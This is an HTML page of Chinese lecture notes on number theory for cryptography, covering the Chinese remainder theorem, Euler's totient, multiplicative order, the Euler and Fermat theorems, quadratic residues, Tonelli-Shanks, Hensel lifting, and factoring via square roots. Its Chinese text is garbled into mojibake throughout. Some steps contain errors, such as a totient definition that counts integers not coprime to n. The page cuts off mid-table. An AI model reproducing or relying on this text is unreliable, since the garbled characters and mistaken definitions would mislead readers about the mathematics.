title="ä¸­å›½å‰©ä½™å®šç†(å­™å­å®šç†)"></a>ä¸­å›½å‰©ä½™å®šç†(å­™å­å®šç†)</h2><p>$è®¾ä¸¤ä¸¤äº’ç´ çš„æ¨¡æ•°n_1,\dots,n_m\in \mathbb{N},ä»¥åŠä»»æ„æ•´æ•°a_1,\dots,a_m\in \mathbb{Z},å¹¶è®¾n={\prod}\limits_{i=1}^mn_i,æ–¹ç¨‹ç»„$</p><p>â€‹        <script type="math/tex">\left \{  \begin{array}{c} x\equiv a_1\pmod {n_1} \\  \dots \\  x\equiv a_m\pmod {n_m} \end{array} \right.</script></p><p>$å¿…æœ‰è§£ï¼Œè®¾è§£ä¸ºa\in \mathbb{Z}ã€‚å¹¶ä¸”å¯¹ä»»æ„a^{â€™}\in \mathbb{Z},éƒ½æœ‰$</p><p>$a^{â€™}æ˜¯æ–¹ç¨‹ç»„çš„è§£\iff a\equiv a^{â€˜}\pmod n$</p><p>$è®¾n=\prod_{i=1}^mn_i$</p><script type="math/tex; mode=display">n_1^{*}=n/n_1,\dots,n_i^{*}=n/n_i,\dots,n_m^{*}=n/n_m</script><p>â€‹            <script type="math/tex">gcd(n_1^{*},n_1)=1,\dots,gcd(n_i^{*},n_i)=1,\dots,gcd(n_m^{*}ï¼Œn_m)=1</script></p><p>â€‹            <script type="math/tex">t_1n_1^{*}\equiv1 \pmod {n_1},\dots,t_in_i^{*}\equiv1 \pmod {n_i},\dots,t_m n_m^{*}\equiv 1 \pmod {n_m}</script></p><p>â€‹            <script type="math/tex">e_i=t_in_i^{*}\equiv\left \{\begin{array}{c}1\pmod {n_i} \\\ 0\pmod {n_j},j\neq i \end{array} \right.</script></p><p>â€‹            $a={\sum}\limits_{i=1}^{m}e_ia_i=e_1a_1+\dots+e_ma_m$</p><script type="math/tex; mode=display">a={\sum}\limits_{i=1}^{m}n_i^{*}n_i^{-1}a_i</script><blockquote><p>ä¾‹ï¼šä¸‰ä¸‰æ•°ä¹‹å‰©äºŒï¼Œäº”äº”æ•°ä¹‹å‰©ä¸‰ï¼Œä¸ƒä¸ƒæ•°ä¹‹å‰©äºŒï¼Œé—®ç‰©å‡ ä½•ï¼Ÿ</p><p>è‡ªå·±å»æœç´¢ã€Šå­™å­æ­Œè¯€ã€‹ï¼Œçœ‹çœ‹è€ç¥–å®—çš„æ™ºæ…§</p><p>ç¬”è€…åœ¨æ­¤ä¸€éæ­¤å¤„çš„åšæ³•</p><script type="math/tex; mode=display">\left \{  \begin{array}{c} x\equiv 2\pmod{3} \\ x\equiv 3\pmod {5}\\  x\equiv 2\pmod {7} \end{array} \right.</script><p>$n=3\times 5\times7=105$</p><script type="math/tex; mode=display">n_1^{*}=n/n_1=35,n_2^{*}=n/n_2=21,n_3^{*}=n/n_3=15</script><script type="math/tex; mode=display">n_1^{*-1}=2ï¼Œn_2^{*-1}=1ï¼Œn_3^{*-1}=1ï¼Œ</script><script type="math/tex; mode=display">PS:n_i^{*-1}ä¸ºn_1^{*}æ¨¡n_içš„ä¹˜æ³•é€†å…ƒ</script><script type="math/tex; mode=display">e_1=35*2=70,e_2=21*1=21,e_3=15*1=15</script><script type="math/tex; mode=display">a={\sum}\limits_{i=1}^{m}n_i^{*}n_i^{-1}a_i=233</script><p>$æœ€åï¼Œ105å†…çš„å”¯ä¸€è§£å³ä¸º233\ mod\ 105=23$</p></blockquote><h3 id="ä¸­å›½å‰©ä½™æ˜ å°„"><a href="#ä¸­å›½å‰©ä½™æ˜ å°„" class="headerlink" title="ä¸­å›½å‰©ä½™æ˜ å°„"></a>ä¸­å›½å‰©ä½™æ˜ å°„</h3><p>$è®¾ä¸¤ä¸¤äº’ç´ çš„æ¨¡æ•°n_1,\dots,n_m\in \mathbb{N},n={\prod}\limits_{i=1}^mn_i,åˆ™ä¸­å›½å‰©ä½™æ˜ å°„$</p><p>$\tauï¼š\mathbb{Z_n}\rightarrow \mathbb{Z_{n_1}}\times\dots\times \mathbb{Z_{n_m}}$</p><p>â€‹    $a\rightarrow(a\ mod\ n_1,\dots,a\ mod\ n_m)$</p><p>$æ˜¯ä¸€ä¸ªåŒå°„$</p><ul><li>$å°†æ‰€æœ‰\mathbb{Z}æ¢æˆå¸¦*çš„ï¼Œå¼å­ä¾ç„¶æˆç«‹$</li></ul><hr><h2 id="æ¬§æ‹‰å‡½æ•°"><a href="#æ¬§æ‹‰å‡½æ•°" class="headerlink" title="æ¬§æ‹‰å‡½æ•°"></a>æ¬§æ‹‰å‡½æ•°</h2><p>å­©å­ä»¬ï¼Œçœ‹åˆ°è¿™é‡Œï¼Œä¸å¦¨å…ˆå¾€å‰ç¿»å‡ ç« ï¼Œçœ‹çœ‹å‰©ä½™ç±»ä¸­æåˆ°çš„ä¸€ä¸ªæ¦‚å¿µ</p><p>$\mathbb{Z^{*}_n}=\{\mathbb{Z_n}ä¸­æœ‰ä¹˜æ³•é€†å…ƒçš„å‰©ä½™ç±»\}$</p><p>â€‹       $=\{[a]\ |\ a=0,1,\dots,n-1,gcd(a,n)=1\}$</p><ul><li><p>$nä¸ºç´ æ•°ï¼š\mathbb{Z^{*}_n}=\mathbb{Z_n}\setminus\{[0]\}$</p></li><li><p>$nä¸ºåˆæ•°ï¼š\mathbb{Z^{*}_n}\subsetneq \mathbb{Z_n}\setminus\{[0]\}$</p></li></ul><p><strong>ä¸å¼•èµ·æ­§ä¹‰çš„æƒ…å†µä¸‹ï¼Œ[ ]å¯ä»¥çœç•¥</strong></p><h3 id="å®šä¹‰ï¼š"><a href="#å®šä¹‰ï¼š" class="headerlink" title="å®šä¹‰ï¼š"></a>å®šä¹‰ï¼š</h3><p>$å¯¹äºæ‰€æœ‰æ­£æ•´æ•°n\in \mathbb{N},å®šä¹‰æ¬§æ‹‰å‡½æ•°$</p><p>$\phi(n)=|\mathbb{Z_n^{*}}|$</p><p>$ä¸”ä»¤\phi(1)=1$</p><p>$æˆ–è€…è¯´,0 \sim {n-1}ä¹‹é—´ä¸näº’ç´ çš„æ•´æ•°æœ‰å¤šå°‘ä¸ªï¼Œ\phi(n)å°±ç­‰äºå‡ $</p><h3 id="ä¸‰ä¸ªæ€§è´¨"><a href="#ä¸‰ä¸ªæ€§è´¨" class="headerlink" title="ä¸‰ä¸ªæ€§è´¨"></a>ä¸‰ä¸ªæ€§è´¨</h3><ul><li><p>$æ€§è´¨ä¸€ï¼šè®¾ä¸¤ä¸¤äº’ç´ çš„æ­£æ•´æ•°n_1,\dots,n_m\in \mathbb{N},å¹¶è®¾n={\prod}\limits_{i=1}^mn_i,$</p><p>$\phi(n)={\prod}\limits_{i=1}^m\phi({n_i})$</p></li><li><p>$æ€§è´¨2ï¼š\phi(p^k)=p^{k-1}\phi(p)$</p></li><li>$æ€§è´¨3ï¼š\phi(p)=p-1$</li></ul><blockquote><p>ä¾‹å­:</p><script type="math/tex; mode=display">\begin{flalign*}&\phi(30000)\\&=\phi(3*2^4*5^4)\\&=\phi(3)*\phi(2^4)*\phi(5^4)\\&=\phi(3)*2^3\phi(2)*5^3\phi(5^4)\\&=2*2^3*1*5^3*4\\&=8000\\&&\end{flalign*}\\</script></blockquote><hr><h2 id="ä¹˜æ³•é˜¶-Multiplicative-Order"><a href="#ä¹˜æ³•é˜¶-Multiplicative-Order" class="headerlink" title="ä¹˜æ³•é˜¶(Multiplicative Order)"></a>ä¹˜æ³•é˜¶(Multiplicative Order)</h2><p>$è®¾a\in \mathbb{Z_n^{*}},ä½¿å¾—a^k\equiv1\pmod nçš„æœ€å°æ­£æ•´æ•°kç§°ä½œaåœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ã€‚ç”¨ord_n(a)è¡¨ç¤ºã€‚$</p><script type="math/tex; mode=display">è®¾a\in \mathbb{Z_n^{*}}çš„(ä¹˜æ³•)é˜¶ä¸ºkï¼Œåˆ™ä»¥ä¸‹æ•´æ•°èƒ½å½¼æ­¤ä¸åŒ\\a^0,a^1,a^2,\dots,a^{k-1}\\æ‰€æœ‰è¿ç®—éƒ½æ¨¡n</script><script type="math/tex; mode=display">a^i\equiv a^j\pmod n,å…¶ä¸­i>j\\a^i/a^j\equiv a^j/a^j\pmod n\\a^{i-j}\equiv1\pmod n\\a^t\equiv1\pmod n,ä»¤t=i-j</script><h3 id="æ€§è´¨ï¼š"><a href="#æ€§è´¨ï¼š" class="headerlink" title="æ€§è´¨ï¼š"></a>æ€§è´¨ï¼š</h3><ul><li>$a^i\equiv1\pmod n\iff k\mid i$</li><li>$a^i\equiv a^j\pmod n\iff i\equiv j \pmod k$</li></ul><blockquote><p>ä¾‹ï¼šè®¾aåœ¨æ¨¡7ä¸‹çš„é˜¶ä¸º3ï¼Œåˆ™</p><p>$a^{101}\equiv a^{101\ mod\ 3}\equiv a^2(mod\ 7)$</p></blockquote><p><strong>æ€§è´¨1</strong>:<script type="math/tex">\forall m\in \mathbb{Z},æœ‰ord_n(a)|m\Leftrightarrow a^m\equiv1\pmod n</script></p><p><strong>æ€§è´¨2</strong>:$a,a^2,a^3,\dots,a^{ord_n(a)}=1å„ä¸ç›¸åŒ$</p><p><strong>æ€§è´¨3</strong>:$\forall k\in \mathbb{Z},åˆ™a^kçš„ä¹˜æ³•é˜¶ä¸ºord_n(a)/gcd(k,ord_n(a))$</p><p><strong>æ€§è´¨4</strong>:$ord_n(a)|\phi(n)$ï¼Œ$ord_p(a)|(p-1)$</p><p><strong>æ€§è´¨5</strong>ï¼š$d$æ˜¯$\phi(n)$çš„æ­£å› å­ï¼Œ<script type="math/tex">Z_n^*</script>é‡Œçš„$d$é˜¶å…ƒç´ ä¸€å…±æœ‰$\phi(d)$ä¸ª</p><hr><h2 id="æ¬§æ‹‰å®šç†-Eulerâ€™s-theorem-amp-è´¹é©¬å°å®šç†-Fermatâ€™s-little-theorem"><a href="#æ¬§æ‹‰å®šç†-Eulerâ€™s-theorem-amp-è´¹é©¬å°å®šç†-Fermatâ€™s-little-theorem" class="headerlink" title="æ¬§æ‹‰å®šç†(Eulerâ€™s theorem)&amp;è´¹é©¬å°å®šç†(Fermatâ€™s little theorem)"></a>æ¬§æ‹‰å®šç†(Eulerâ€™s theorem)&amp;è´¹é©¬å°å®šç†(Fermatâ€™s little theorem)</h2><p>æ¬§æ‹‰å®šç†ï¼š<script type="math/tex">è®¾a\in \mathbb{Z_n^{*}},åˆ™\\a^{\phi(n)}\equiv1\pmod n</script></p><p>$ä¸”k\mid \phi(n),å…¶ä¸­kæ˜¯aåœ¨æ¨¡nä¸‹çš„é˜¶$</p><p><strong>$a^{\phi(p)}\equiv 1\pmod p$</strong></p><p><strong>$a^{p-1}\equiv 1\pmod p$</strong></p><p>ä¸¤è¾¹éƒ½ä¹˜a</p><p>å¾—åˆ°$a^p\equiv a\pmod p$</p><p>å³<strong>è´¹é©¬å°å®šç†</strong>$(å¯¹äºä»»æ„ç´ æ•°på’Œæ•´æ•°a\in \mathbb{Z_p},éƒ½æœ‰a^p\equiv a\pmod p)$</p><blockquote><p>ä¾‹é¢˜ï¼š</p><p>æ±‚$3^{2022}\ mod\ 8$</p><p>$gcd(3,8)=1,å¯ç”¨æ¬§æ‹‰å®šç†$</p><p>$\phi(8)=\phi(2^3)=2^2\phi(2)=4,æ‰€ä»¥3^4\equiv1\pmod 8$</p><script type="math/tex; mode=display">3^{2022}\ mod\ 8\\=3^{505\times4+2}\ mod\ 8\\=3^2\ mod\ 8\\=1</script></blockquote><h3 id="å®šç†ï¼š-è®¾a-in-mathbb-Z-n-m-in-mathbb-Z-aåœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºkï¼Œåˆ™a-måœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºk-gcd-m-k"><a href="#å®šç†ï¼š-è®¾a-in-mathbb-Z-n-m-in-mathbb-Z-aåœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºkï¼Œåˆ™a-måœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºk-gcd-m-k" class="headerlink" title="å®šç†ï¼š$è®¾a\in \mathbb{Z_n^{*}},m\in \mathbb{Z},aåœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºkï¼Œåˆ™a^måœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºk/gcd(m,k)$"></a>å®šç†ï¼š$è®¾a\in \mathbb{Z_n^{*}},m\in \mathbb{Z},aåœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºkï¼Œåˆ™a^måœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºk/gcd(m,k)$</h3><p>$è¯æ˜:è®¾a^mçš„é˜¶ä¸ºt,åˆ™ (a^m)t\equiv1\mathrm{~(mod~n)}$<br>$æ‰€ä»¥ a^{mt}\equiv 1\pmod n,å¿…æœ‰ k|mt $<br>$åˆ™æœ‰ mt \equiv 0\pmod k$<br>$t\equiv 0\pmod{k/gcd(m,k)}$</p><blockquote><p>ä¾‹é¢˜ï¼š</p><p>$è®¾a\in Z_n^{*}çš„ä¹˜æ³•é˜¶æ˜¯6ï¼Œæ±‚a^9çš„ä¹˜æ³•é˜¶$</p><script type="math/tex; mode=display">è§£ï¼šk=6ï¼Œm=9ï¼Œ\\gcd(k,m)=3,åˆ™\\é˜¶ä¸ºk/gcd(k,m)=2</script></blockquote><hr><h2 id="äºŒæ¬¡å‰©ä½™-Quadratic-residue"><a href="#äºŒæ¬¡å‰©ä½™-Quadratic-residue" class="headerlink" title="äºŒæ¬¡å‰©ä½™(Quadratic residue)"></a>äºŒæ¬¡å‰©ä½™(Quadratic residue)</h2><p>$x^2\equiv a\pmod {n}$</p><script type="math/tex; mode=display">å®šä¹‰ï¼šè®¾a\in \mathbb{Z}_n^{*},å¦‚æœå­˜åœ¨æ•´æ•°b\in \mathbb{Z},\\ä½¿å¾—b^2\equiv a\pmod n,\\åˆ™ç§°aä¸ºæ¨¡nä¸‹çš„äºŒæ¬¡å‰©ä½™ï¼Œ\\å¹¶ç§°bä¸ºaåœ¨æ¨¡nä¸‹çš„å¹³æ–¹æ ¹</script><p>äºŒæ¬¡å‰©ä½™çš„é›†åˆï¼š$(\mathbb{Z}_n^{*})^2$</p><script type="math/tex; mode=display">(\mathbb{Z}_n^{*})^2=\{b^2|b\in \mathbb{Z_n^{*}}\}</script><script type="math/tex; mode=display">a,b\in \mathbb{Z_n}æˆ–\mathbb{Z_n^{*}}æ—¶ï¼Œab\ mod\ n,ç®€å†™ä¸º ab</script><script type="math/tex; mode=display">è‹¥a\in \mathbb{(Z_n^{*}})^2,åˆ™å­˜åœ¨b\in \mathbb{Z_n^{*}}ï¼Œä½¿å¾—b^2\equiv a\pmod n)</script><p>$aæ˜¯æ¨¡nä¸‹çš„äºŒæ¬¡å‰©ä½™\iff a\in (\mathbb{Z_n^*})^2$</p><h3 id="æ¨¡pä¸‹çš„äºŒæ¬¡å‰©ä½™"><a href="#æ¨¡pä¸‹çš„äºŒæ¬¡å‰©ä½™" class="headerlink" title="æ¨¡pä¸‹çš„äºŒæ¬¡å‰©ä½™"></a>æ¨¡pä¸‹çš„äºŒæ¬¡å‰©ä½™</h3><ul><li><p>$è®¾pæ˜¯å¥‡ç´ æ•°(pæ˜¯ç´ æ•°ï¼Œä¸”p\neq2)$</p><p>$1.è®¾b\in \mathbb{Z_p},åˆ™b^2=1\iff b=\pm1$</p><p>$2.è®¾b,c\in \mathbb{Z_p^*},åˆ™b^2=c^2\iff b=\pm c$</p><p>$3.|(\mathbb{Z_p^*})^2|=(p-1)/2$</p></li></ul><h4 id="æ¬§æ‹‰å‡†åˆ™-Eulerâ€™s-criterion"><a href="#æ¬§æ‹‰å‡†åˆ™-Eulerâ€™s-criterion" class="headerlink" title="æ¬§æ‹‰å‡†åˆ™(Eulerâ€™s criterion)"></a>æ¬§æ‹‰å‡†åˆ™(Eulerâ€™s criterion)</h4><p>$è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œa\in \mathbb{Z_p^*,}åˆ™$</p><ul><li><p>$1.\ a^{\frac{p-1}2}=\pm1$(è¯æ˜ä¾æ®æ¬§æ‹‰å®šç†)</p></li><li><p>$2.\ a\in (\mathbb{Z_p^*})^2\Rightarrow a^{\frac{p-1}2}=1$</p></li><li><p>$3.\ a\notin (\mathbb{Z_p^*})^2\Rightarrow a^{\frac{p-1}2}=-1$</p><p>$è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œa,b\in \mathbb{Z_p^*},åˆ™a,båŒä¸ºäºŒæ¬¡å‰©ä½™æˆ–äºŒæ¬¡éå‰©ä½™æ—¶ï¼Œabä¸ºäºŒæ¬¡å‰©ä½™\(ab)^{\frac{p-1}2}=a^{\frac{p-1}2}b^{\frac{p-1}2}$</p></li></ul><h4 id="æ¨¡pä¸‹-1-çš„å¹³æ–¹æ ¹"><a href="#æ¨¡pä¸‹-1-çš„å¹³æ–¹æ ¹" class="headerlink" title="æ¨¡pä¸‹$-1$çš„å¹³æ–¹æ ¹"></a>æ¨¡pä¸‹$-1$çš„å¹³æ–¹æ ¹</h4><ul><li>$æ€§è´¨ä¸€ï¼šp\equiv 1\pmod 4\iff {-1}\in(\mathbb{Z_p^*})^2$</li><li><script type="math/tex; mode=display">æ€§è´¨äºŒï¼šè®¾p\equiv 1\pmod 4,c\in \mathbb{Z_p^*}\setminus(\mathbb{Z_p^*})^2\\ä»¤b:=c^{\frac{p-1}4}\pmod p,åˆ™\\b^2\equiv -1\pmod p</script></li></ul><h4 id="è´¹é©¬äºŒå¹³æ–¹å®šç†ï¼ˆFermatsâ€™s-two-squares-theoremï¼‰"><a href="#è´¹é©¬äºŒå¹³æ–¹å®šç†ï¼ˆFermatsâ€™s-two-squares-theoremï¼‰" class="headerlink" title="è´¹é©¬äºŒå¹³æ–¹å®šç†ï¼ˆFermatsâ€™s two squares theoremï¼‰"></a>è´¹é©¬äºŒå¹³æ–¹å®šç†ï¼ˆFermatsâ€™s two squares theoremï¼‰</h4><script type="math/tex; mode=display">è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œåˆ™\\p\equiv 1\pmod 4\iff p=s^2+t^2,s,t\in \mathbb{Z}</script><h4 id="æ±‚å¹³æ–¹æ ¹"><a href="#æ±‚å¹³æ–¹æ ¹" class="headerlink" title="æ±‚å¹³æ–¹æ ¹"></a>æ±‚å¹³æ–¹æ ¹</h4><p>$p\equiv 3\pmod 4æ±‚äºŒæ¬¡å‰©ä½™çš„å¹³æ–¹æ ¹$</p><p>$è®¾a\in (\mathbb{Z_p^*})^2ï¼Œp\equiv 3\pmod 4ï¼Œåˆ™açš„ä¸€ä¸ªå¹³æ–¹æ ¹ä¸ºb=a^{\frac{p+1}{4}}$</p><p><strong>é€šç”¨ç®—æ³•(Tonelli-Shanksç®—æ³•)(aæ˜¯äºŒæ¬¡å‰©ä½™ï¼Œæ±‚açš„å¹³æ–¹æ ¹)</strong></p><p>$pæ˜¯å¥‡æ•°\Rightarrow p-1æ˜¯å¶æ•°\Rightarrow p-1=2^tm(mæ˜¯å¥‡æ•°ï¼Œä»¤m=2q+1)$</p><blockquote><p>1.$è®¡ç®—tã€m,æ»¡è¶³p-=2^tm$</p><p>2.<script type="math/tex">æ‰¾ä¸€ä¸ªu\in Z_p^*\setminus (Z_p^*)^2,è®¡ç®—a^må’Œu^m</script></p><p>3.$è®¡ç®—xï¼Œä½¿å¾—(u^m)^x=a^m$</p><p>4.$è®¡ç®—k=u^{\frac{mx}2}(æ˜“çŸ¥ï¼Œk^2=a^m)$</p><p>5.$outputï¼š\pm ka^{-q}$</p><p>$(\pm ka^{-q})^2=k^2a^{-2q}=a^ma^{-2q}=a^{m-2p}=a$</p><p>PS:$t=1æ—¶ï¼Œp=2m+1=2(2q+1)+1=4q+3\Rightarrow p\equiv 3\pmod 4$</p><p>â€‹      $t&gt;1æ—¶ï¼Œä¸æ–­åœ°éšæœºå¯»æ‰¾æ•´æ•°uï¼Œç›´åˆ°(\frac{u}p)=-1ä¸ºæ­¢$</p></blockquote><h3 id="æ¨¡-p-k-ä¸‹çš„äºŒæ¬¡å‰©ä½™"><a href="#æ¨¡-p-k-ä¸‹çš„äºŒæ¬¡å‰©ä½™" class="headerlink" title="æ¨¡$p^k$ä¸‹çš„äºŒæ¬¡å‰©ä½™"></a>æ¨¡$p^k$ä¸‹çš„äºŒæ¬¡å‰©ä½™</h3><p>$pæ˜¯å¥‡ç´ æ•°ï¼Œkæ˜¯æ­£æ•´æ•°,p^k\mid a\Rightarrow p\mid a$</p><p>$1.è®¾b\in \mathbb{Z_{p^k}},åˆ™b^2=1\iff b=\pm1$</p><p>$2.è®¾b,c\in \mathbb{Z_{p^k}^*},åˆ™b^2=c^2\iff b=\pm c$</p><p>$3.|(\mathbb{Z_{p^k}^*)}^2|=\phi(p^k)/2$</p><p>$è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œa\in \mathbb{Z_{p^k}^*},åˆ™$</p><ul><li><p>$1.\ a^{\frac{\phi(p^k)}2}=\pm1$(è¯æ˜ä¾æ®æ¬§æ‹‰å®šç†)</p></li><li><p>$2.\ a\in (\mathbb{Z_{p^k}^*)}^2\Rightarrow a^{\frac{\phi(p^k)}2}=1$</p></li><li><p>$3.\ a\notin (\mathbb{Z_{p^k}^*)}^2\Rightarrow a^{\frac{\phi(p^k)}2}=-1$</p><script type="math/tex; mode=display">è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œa,b\in \mathbb{Z_p^*},åˆ™a,båŒä¸ºäºŒæ¬¡å‰©ä½™æˆ–äºŒæ¬¡éå‰©ä½™æ—¶ï¼Œabä¸ºäºŒæ¬¡å‰©ä½™\\(ab)^{\frac{p-1}2}=a^{\frac{p-1}2}b^{\frac{p-1}2}</script></li></ul><script type="math/tex; mode=display">a\in (\mathbb{Z_{p^k}^*})^2\iff a\in (\mathbb{Z_p^*})^2</script><h4 id="æ±‚å¹³æ–¹æ ¹-1"><a href="#æ±‚å¹³æ–¹æ ¹-1" class="headerlink" title="æ±‚å¹³æ–¹æ ¹"></a>æ±‚å¹³æ–¹æ ¹</h4><p>$gcd(a,p)=1,k&gt;1æ˜¯æ•´æ•°$</p><p>$aæ˜¯æ¨¡p^kä¸‹çš„äºŒæ¬¡å‰©ä½™\iff aæ˜¯æ¨¡pä¸‹çš„äºŒæ¬¡å‰©ä½™\ \ \underrightarrow{Tonelli-Shanksç®—æ³•}\ \ æ¨¡pä¸‹çš„å¹³æ–¹æ ¹\\ \rightarrow æ¨¡p^2ä¸‹çš„å¹³æ–¹æ ¹\rightarrow\dots\rightarrow æ¨¡p^kä¸‹çš„å¹³æ–¹æ ¹(Hensel\ lifting)$</p><h4 id="Hensel-liftingæŠ€æœ¯"><a href="#Hensel-liftingæŠ€æœ¯" class="headerlink" title="Hensel  liftingæŠ€æœ¯"></a>Hensel  liftingæŠ€æœ¯</h4><p>$è®¾t\geq 1æ˜¯æ•´æ•°ï¼Œaåœ¨æ¨¡p^tä¸‹çš„å¹³æ–¹æ ¹æ˜¯bï¼Œå³b^2\equiv a\pmod {p^t}$</p><p>$ç›®æ ‡ï¼šåˆ©ç”¨bï¼Œæ±‚å‡ºaåœ¨æ¨¡p^{t+1}ä¸‹çš„å¹³æ–¹æ ¹c$</p><blockquote><p>$c^2\equiv a\pmod {p^{t+1}}\Rightarrow c^2\equiv a\pmod {p^t}\Rightarrow c^2\equiv b^2\pmod{p^t}\Rightarrow c\equiv \pm b\pmod{p^t}$</p><p>$è®¾c=b+p^tv,åˆ™æœ‰c^2\equiv (b+p^tv)^2\equiv b^2+2bp^tv\pmod {p^{t+1}}(å®Œå…¨å¹³æ–¹å±•å¼€)$</p><p>$a-b^2\equiv 2bp^tv\pmod{p^{t+1}}$</p><p>$\frac{a-b^2}{p^t}\equiv 2bv\pmod p\Rightarrow v\equiv (\frac{a-b^2}{p^t})(2b)^{-1}\pmod p$</p></blockquote><h3 id="æ¨¡nä¸‹çš„äºŒæ¬¡å‰©ä½™"><a href="#æ¨¡nä¸‹çš„äºŒæ¬¡å‰©ä½™" class="headerlink" title="æ¨¡nä¸‹çš„äºŒæ¬¡å‰©ä½™"></a>æ¨¡nä¸‹çš„äºŒæ¬¡å‰©ä½™</h3><p>$è®¾n&gt;1æ˜¯å¥‡æ•°ï¼Œä¸”n=p_1^{k1}\times\dots\times p_m^{k_m}$</p><ul><li><p>$a\in (Z_n^*)^2\iff a_i\in(Z_{p_i^{k_i}})^2,i=1,\dots,m$</p></li><li><p>$|(Z_n^*)|=\phi(n)/2^m$</p></li><li><p>$a\in (Z_n^*)^2,åˆ™aæ°å¥½æœ‰2^mä¸ªå¹³æ–¹æ ¹$</p><script type="math/tex; mode=display">a\in (Z_n^*)^2\iff a\pmod {p_i^{k_i}}\in (\mathbb{Z_{p_i^{k_i}}^*})^2\iff a\pmod {p_i} \in (\mathbb{Z_{p_i}^*})^2,i=1,\dots,m</script></li></ul><blockquote><p>ä¾‹ï¼š$45=3^2Ã—5 ï¼Œæ­¤æ—¶m = 2$</p><p>æ‰€ä»¥ï¼š $|\mathbb{(Z_{45}^âˆ—)^2}|=\frac{\phi(45)}{2^2}=6 ã€‚$</p><p>å¯ä»¥ç”¨ä¸­å›½å‰©ä½™æ˜ å°„è®¡ç®—ï¼š $(\mathbb{Z_9^âˆ—})^2={1,4,7} , (\mathbb{Z_5^âˆ—})2={1,4}$</p><p>å¯å¾—ï¼š</p><p>$(\mathbb{Z_9^âˆ—})^2Ã—(\mathbb{Z_5^âˆ—})^2={(1,1),(1,4),(4,1),(4,4),(7,1),(7,4)}$</p><p>ç„¶åç”¨ä¸­å›½å‰©ä½™å®šç†å°±å¯ä»¥æ±‚è§£å…·ä½“äºŒæ¬¡å‰©ä½™ã€‚</p><p><strong>å¹³æ–¹æ ¹æ‰¾æ³•</strong>ï¼šæ¯”å¦‚$(1ï¼Œ4)$å¯ä»¥æ‹†è§£ä¸º</p><p>$(Z_9^âˆ—)Ã—(Z_5^âˆ—)={(1,2),(âˆ’1,2),(1,âˆ’2),(âˆ’1,âˆ’2)}$</p></blockquote><h4 id="æ±‚å¹³æ–¹æ ¹-2"><a href="#æ±‚å¹³æ–¹æ ¹-2" class="headerlink" title="æ±‚å¹³æ–¹æ ¹"></a>æ±‚å¹³æ–¹æ ¹</h4><p>$n=p_1^{k_1}\dots p_m^{k_m}æ˜¯å¥‡åˆæ•°$</p><p>$a(=b^2)\ \underrightarrow{ä¸­å›½å‰©ä½™æ˜ å°„}\ (a_1,\dots,a_m)\rightarrow (b_1,\dots,b_m)\ \underrightarrow{ä¸­å›½å‰©ä½™å®šç†}\ b$</p><h4 id="è‹¥å·²çŸ¥â€œæ±‚å¹³æ–¹æ ¹â€œçš„é«˜æ•ˆç®—æ³•ï¼Œå¯æ„é€ é«˜æ•ˆç®—æ³•æ¥â€œå› å­åˆ†è§£nâ€"><a href="#è‹¥å·²çŸ¥â€œæ±‚å¹³æ–¹æ ¹â€œçš„é«˜æ•ˆç®—æ³•ï¼Œå¯æ„é€ é«˜æ•ˆç®—æ³•æ¥â€œå› å­åˆ†è§£nâ€" class="headerlink" title="è‹¥å·²çŸ¥â€œæ±‚å¹³æ–¹æ ¹â€œçš„é«˜æ•ˆç®—æ³•ï¼Œå¯æ„é€ é«˜æ•ˆç®—æ³•æ¥â€œå› å­åˆ†è§£nâ€"></a>è‹¥å·²çŸ¥â€œæ±‚å¹³æ–¹æ ¹â€œçš„é«˜æ•ˆç®—æ³•ï¼Œå¯æ„é€ é«˜æ•ˆç®—æ³•æ¥â€œå› å­åˆ†è§£nâ€</h4><blockquote><p>åŸç†ï¼š$n=pq$ç¡®å®šæ€§ç®—æ³•A(a,n)è¿”å›aåœ¨æ¨¡æ•°nä¸‹çš„ä¸€ä¸ªå¹³æ–¹æ ¹</p><p>B(n):$éšæœºé€‰æ‹©b\in \{1,\dots,n-1\}$</p><p>â€‹        $if\ d:=gcd(b,n)&gt;1:output\ \ d,n/d$</p><p>â€‹        $else\ a=b^2,bâ€™=A(a,n)$</p><p>â€‹                $if\ bâ€™=\pm b: output\ â€˜failureâ€™$</p><p>â€‹                $else\ output\ dâ€™:=gcd(b-bâ€™,n),n/dâ€™$</p><div class="table-container"><table><thead><tr><th style="text-align:center">$nçš„å¹³æ–¹æ ¹$</th><th style="text-align:center">æ¨¡pã€qåä½™æ•°å½¢æˆçš„äºŒå…ƒç»„</th></tr></thead><tbody><tr><td style="text-align:center">b</td><td style="text-align:center">$(b_1,b_2)$</td></tr><tr><td style="text-align:center">-b</td><td style="text-align:center">$(-b_1,-b_2)$</td></tr><tr><td style="text-align:center">bâ€™</td><td style="text-align:center">$(-b_1,b_2)$</td></tr><tr><td style="text-align:center">-bâ€™</td><td style="text-align:center">$(b_1,-b_2)$</td></tr></tbody></table></div><p>$b-bâ€™\rightarrow(b_1,b_2)-(-b_1,b_2)=(2b_1,0)\rightarrow\ æ¨¡qä¸º0ï¼Œæ˜¯qçš„å€æ•°$</p></blockquote><h3 id="å½’çº³"><a href="#å½’çº³" class="headerlink" title="å½’çº³"></a>å½’çº³</h3><div class="table-container"><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">äºŒæ¬¡å‰©ä½™æ•°é‡</th><th style="text-align:center">äºŒæ¬¡å‰©ä½™çš„å¹³æ–¹æ ¹</th></tr></thead><tbody><tr><td style="text-align:center">$p$</td><td style="text-align:center">$\phi(p)/2(é›†åˆå¤§å°çš„ä¸€åŠï¼‰$</td><td style="text-align:center">$2ä¸ª$</td></tr><tr><td style="text-align:center">$p^k$</td><td style="text-align:center">$\phi(p^k)/2(é›†åˆå¤§å°çš„ä¸€åŠï¼‰$</td><td 